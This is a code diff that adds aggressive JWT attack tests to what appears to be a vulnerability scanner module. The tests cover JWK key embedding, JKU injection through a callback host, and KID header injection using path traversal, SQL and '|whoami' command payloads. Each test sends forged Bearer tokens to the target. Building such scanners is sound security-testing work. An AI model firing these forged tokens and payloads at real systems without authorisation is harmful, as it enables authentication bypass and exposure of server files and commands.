@@ -23,6 +23,7 @@ class JwtModule(BaseModule):
     
     async def scan(self, target):
         self.findings = []
+        self.cracked_secrets = []
         
         resp = await self.http.get(target)
         if not resp.get("status"):
@@ -36,7 +37,129 @@ class JwtModule(BaseModule):
         for token in tokens:
             await self._full_token_analysis(target, token)
         
+        if self.aggressive:
+            await self._test_jwk_injection(target, tokens)
+            await self._test_jku_injection(target, tokens)
+            await self._test_kid_injection(target, tokens)
+        
         return self.findings
+    
+    async def _test_jwk_injection(self, target, tokens):
+        for token in tokens:
+            try:
+                parts = token.split(".")
+                header = self._decode_part(parts[0])
+                payload = self._decode_part(parts[1])
+                
+                if not header or not payload:
+                    continue
+                
+                new_header = header.copy()
+                new_header["alg"] = "HS256"
+                new_header["jwk"] = {
+                    "kty": "oct",
+                    "k": base64.urlsafe_b64encode(b"attacker-secret").decode().rstrip("=")
+                }
+                
+                forged = self._sign_token(new_header, payload, "attacker-secret", "HS256")
+                if forged:
+                    resp = await self.http.get(target, headers={"Authorization": f"Bearer {forged}"})
+                    if self._check_auth_success(resp):
+                        self.add_finding(
+                            "CRITICAL",
+                            "JWT JWK Injection - Key Embedding Attack",
+                            url=target,
+                            evidence="Server used attacker-embedded key",
+                            confidence_evidence=["jwk_injection", "auth_bypass"],
+                            request_data={"method": "GET", "url": target}
+                        )
+                        return
+            except:
+                pass
+    
+    async def _test_jku_injection(self, target, tokens):
+        oob_manager = self.config.get("oob_manager")
+        callback_host = self.config.get("callback_host")
+        
+        if not callback_host and not oob_manager:
+            return
+        
+        jku_url = f"http://{callback_host}/jwks.json" if callback_host else oob_manager.get_http_url("jku-test")
+        
+        for token in tokens:
+            try:
+                parts = token.split(".")
+                header = self._decode_part(parts[0])
+                payload = self._decode_part(parts[1])
+                
+                if not header or not payload:
+                    continue
+                
+                new_header = header.copy()
+                new_header["alg"] = "RS256"
+                new_header["jku"] = jku_url
+                
+                forged = f"{self._encode_part(new_header)}.{self._encode_part(payload)}.fakesig"
+                resp = await self.http.get(target, headers={"Authorization": f"Bearer {forged}"})
+                
+                if oob_manager:
+                    import asyncio
+                    await asyncio.sleep(2)
+                    interactions = oob_manager.check_interactions("jku-test")
+                    if interactions:
+                        self.add_finding(
+                            "CRITICAL",
+                            "JWT JKU Injection - Server Fetched External JWKS",
+                            url=target,
+                            evidence=f"Server contacted: {jku_url}",
+                            confidence_evidence=["jku_injection", "ssrf_via_jwt"],
+                            request_data={"method": "GET", "url": target}
+                        )
+                        return
+            except:
+                pass
+    
+    async def _test_kid_injection(self, target, tokens):
+        kid_payloads = [
+            ("../../../../../../dev/null", "null file"),
+            ("../../../../../../etc/hostname", "file read"),
+            ("'; SELECT * FROM keys; --", "sql injection"),
+            ("|whoami", "command injection"),
+            ("../../../../../../../proc/self/environ", "environ read"),
+        ]
+        
+        for token in tokens:
+            try:
+                parts = token.split(".")
+                header = self._decode_part(parts[0])
+                payload = self._decode_part(parts[1])
+                
+                if not header or not payload:
+                    continue
+                
+                for kid_payload, attack_type in kid_payloads:
+                    new_header = header.copy()
+                    new_header["kid"] = kid_payload
+                    
+                    if "null" in kid_payload:
+                        forged = self._sign_token(new_header, payload, "", "HS256")
+                    else:
+                        forged = f"{self._encode_part(new_header)}.{self._encode_part(payload)}.fakesig"
+                    
+                    if forged:
+                        resp = await self.http.get(target, headers={"Authorization": f"Bearer {forged}"})
+                        if self._check_auth_success(resp):
+                            self.add_finding(
+                                "CRITICAL",
+                                f"JWT KID Injection ({attack_type})",
+                                url=target,
+                                evidence=f"KID: {kid_payload[:30]}",
+                                confidence_evidence=["kid_injection", attack_type.replace(" ", "_")],
+                                request_data={"method": "GET", "url": target}
+                            )
+                            return
+            except:
+                pass
     
     def _find_jwt_tokens(self, resp):
         tokens = set()
